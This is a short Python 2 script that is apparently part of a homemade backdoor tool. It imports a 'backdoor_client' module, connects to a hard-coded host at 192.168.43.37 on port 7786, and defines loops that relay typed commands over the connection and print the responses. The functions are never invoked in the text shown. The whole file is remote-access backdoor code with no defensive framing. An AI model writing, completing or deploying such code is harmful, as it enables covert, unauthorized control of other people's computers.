# -*- coding: future_fstrings -*-
import backdoor_client


def send():
    while True:
        msg = raw_input()
        client.reliable_send(msg)


def receive():
    while True:
        msg = client.reliable_receive()
        print(msg)


ip = "192.168.43.37"
port = 7786
client = backdoor_client.client(ip, port)
